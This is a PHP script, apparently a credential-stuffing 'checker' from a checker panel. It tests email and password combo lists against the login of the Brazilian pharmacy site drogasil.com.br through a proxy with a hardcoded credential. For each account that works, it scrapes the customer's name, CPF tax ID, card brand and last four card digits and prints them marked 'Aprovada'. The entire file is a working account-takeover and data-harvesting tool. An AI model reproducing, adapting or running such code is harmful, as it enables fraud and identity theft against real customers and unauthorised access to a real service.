<?php


error_reporting(0);

extract($_GET); 
function multiseparador($delimiters,$string) { 
$ready = str_replace($delimiters, $delimiters[0], $string); 
$launch = explode($delimiters[0], $ready); 
return  $launch; 
} 
list($email, $senha) = multiseparador(array(";","|",":"," » "," "), $lista); 

class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_PROXY, "proxy.apify.com:8000");
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "auto:eLvyKY49pqBaHoJ3ehQykC5TW");
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$a = new cURL();
$b = $a->get('https://www.drogasil.com.br/customer/account/login/');

$form_key = GetStr($b, '<input name="form_key" type="hidden" value="','"');

$c = $a->post('https://www.drogasil.com.br/customer/account/loginPost/','form_key='.$form_key.'&login%5Busername%5D='.$email.'&login%5Bpassword%5D='.$senha.'&send=');
$dados = $a->get('https://www.drogasil.com.br/customer/account/edit/');
$card = $a->get('https://www.drogasil.com.br/paymentfront/customer_creditcard/');

/* DADOS */

$nome = GetStr($dados, '<input type="text" id="firstname" name="firstname" value="','"');
$cpf = GetStr($dados, '<input type="text" id="taxvat" name="taxvat" value="','"');

$type_card = GetStr($card, '<div class="cards-img"><img src="','"');

if($type_card == "https://s2.drogasil.com.br/skin/frontend/drogasil/default/esmart/creditcard/images/VI.png"){
    $tipo = "VISA";
    } elseif($type_card == "https://s2.drogasil.com.br/skin/frontend/drogasil/default/esmart/creditcard/images/MC.png"){
    $tipo = "MASTER";
    } elseif($type_card == "https://s2.drogasil.com.br/skin/frontend/drogasil/default/esmart/creditcard/images/AE.png"){
	$tipo = "AMEX";
	}
	elseif($type_card == "https://s2.drogasil.com.br/skin/frontend/drogasil/default/esmart/creditcard/images/DI.png"){
	$tipo = "DINERS";
	}elseif($type_card == "https://s2.drogasil.com.br/skin/frontend/drogasil/default/esmart/creditcard/images/EL.png"){
	$tipo = "ELO";
	}
	elseif($type_card == "https://s2.drogasil.com.br/skin/frontend/drogasil/default/esmart/creditcard/images/HI.png"){
	$tipo = "HIPERCARD";
	}

$cc = GetStr($card, '<div class="numero">',' </div>');
$cartao = substr($cc, 12, 4);

/* FIM */

    if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }
        
if (strpos($c, "Olá,") !== false){
	echo "#Aprovada ➜ $email|$senha [ NOME: $nome | CPF: $cpf | CARTÃO: $tipo - $cartao ] #PainelCheckers";
	} else {
	echo "#Reprovada ➜ $email|$senha #PainelCheckers";
	}

?>
